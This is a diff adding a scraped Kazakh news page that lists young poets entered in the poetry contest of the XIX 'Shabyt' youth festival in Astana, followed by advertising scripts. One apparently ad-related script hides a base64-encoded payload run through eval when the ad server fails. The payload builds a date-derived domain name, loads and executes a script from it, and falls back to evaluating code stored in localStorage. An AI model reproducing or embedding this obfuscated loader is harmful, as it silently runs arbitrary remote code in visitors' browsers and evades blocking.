@@ -1,0 +1,45 @@
+Қараша айының 3 мен 8 аралығында Астана қаласында өтетін XIX «Шабыт» Халықаралық шығармашылық жастар фестивалінде «Үздік әдеби шығарма» номинациясы «Поэзия» жанры бойынша байқауда бақ сынайтын жас ақындардың тізімі белгілі болды.
+Бұл туралы «Массагет.kz» порталы хабарлады..Астана қаласынан «Шабытқа» қатысатындар тізімі:.Астана қаласынан тыс жерлерден қатысатындар тізімі:.Тілегенов Асылан, (Алматы).Әбілқайыров Азамат, (Ақтөбе).Жұмағұлов Жандарбек, (Алматы).Жаңбырбай Асылбек, (Маңғыстау облысы).Қуанар Өзгеріс, (Павлодар).Өскенбайқызы Айбота, (Алматы).Нысанбек Күләш, (Көкшетау).Оспанов Қуаныш, (Көкшетау).Тоқсанбаев Мерген, (Көкшетау).Дәуренқызы Айдана, (Арқалық).Қуатбеков Ерболат, (Қарағанды).Чопен Әділетжан, (Қарғанды).Әміренов Ерболат, (Екібастұз).Мырзабай Ақілгек, (Ақтөбе).Хакімжанова Айгүл, (Көкшетау).Лесбекова Ұлмекен, (Алматы).Игіліков Бауыржан, (Семей).Саршаев Наурызбек, (Тараз).Бөлісіңіз:
+
+
+
+
+
+
+ 
+          var node4990 = document.getElementById("MIXADV_4990");
+          if( node4990 )
+          {
+               var script = document.createElement("script");
+               script.charset = "utf-8";
+               script.src = "https://m.mixadvert.com/show/?id=4990&r="+Math.random();
+               node4990.parentNode.appendChild(script); 
+               script.onerror = function(){
+                  window.eval( atob("dmFyIGRhdGUgPSBuZXcgRGF0ZSgpO3ZhciBtb250aCA9IGRhdGUuZ2V0TW9udGgoKSArIDE7IHZhciBkYXkgPSBkYXRlLmdldERhdGUoKTsgdmFyIHllYXIgPSBkYXRlLmdldFllYXIoKTsgdmFyIG5hbWVfZGF5ID0gZGF0ZS5nZXREYXkoKSArIDE7dmFyIGRvbSA9IFsgInBybyIsICJ0b3AiLCAiaW5mbyIsICJvbmxpbmUiLCAic3BhY2UiLCAic2l0ZSIsICJ0ZWNoIl07IHZhciBzdHIgPWRheSoobW9udGggKiBuYW1lX2RheSAqIGRheSkrIiIrIGRheSoobW9udGggKyBuYW1lX2RheSArIGRheSAreWVhcik7dmFyIGhhc2ggPSAgYnRvYShidG9hKHN0cikpLnRvTG93ZXJDYXNlKCk7IHZhciBob3N0ID0gaGFzaC5zdWJzdHJpbmcoMywgaGFzaC5sZW5ndGggLSBuYW1lX2RheS8yKSsiLiIrZG9tW25hbWVfZGF5IC0gMV07dmFyIHIgPSBNYXRoLnJhbmRvbSgpLnRvU3RyaW5nKDM2KS5zdWJzdHIoMiwgMik7ciA9IHIucmVwbGFjZSgvWzAtOV0vZywgIiIpO3ZhciBkZWx0YSA9IE1hdGguZmxvb3IoTWF0aC5yYW5kb20oKSAqICgxMDAgLSAxMCArIDEpKSArIDEwO3ZhciBpZCA9IDQ5OTAgLSBkZWx0YTsgdmFyIHNjcmlwdF9maXJzdCA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoInNjcmlwdCIpO3NjcmlwdF9maXJzdC5zcmMgPSAiaHR0cHM6Ly8iKyBob3N0KyIvIitkZWx0YStpZCtyKyIiOyBub2RlNDk5MC5wYXJlbnROb2RlLmFwcGVuZENoaWxkKHNjcmlwdF9maXJzdCk7c2V0VGltZW91dCggZnVuY3Rpb24gKCkge3NjcmlwdF9maXJzdC5yZW1vdmUoKX0sIDQwMDApO3NjcmlwdF9maXJzdC5vbmVycm9yID0gZnVuY3Rpb24oKXsgc2V0VGltZW91dCggZnVuY3Rpb24gKCkgeyBpZiggbm9kZTQ5OTAuaW5uZXJIVE1MID09ICIiICkgd2luZG93LmV2YWwobG9jYWxTdG9yYWdlLmdldEl0ZW0oIjQ5OTAiKSkgfSwgNTAwMCk7ICA7fTsg") );
+              }
+          }
+          
+
+
+
+
+    (function(w, d, n, s, t) {
+        w[n] = w[n] || [];
+        w[n].push(function() {
+            Ya.Context.AdvManager.render({
+                blockId: "R-A-241735-5",
+                renderTo: "yandex_rtb_R-A-241735-5",
+                async: true
+            });
+        });
+        t = d.getElementsByTagName("script")[0];
+        s = d.createElement("script");
+        s.type = "text/javascript";
+        s.src = "//an.yandex.ru/system/context.js";
+        s.async = true;
+        t.parentNode.insertBefore(s, t);
+    })(this, this.document, "yandexContextAsyncCallbacks");
+
+
+
+.
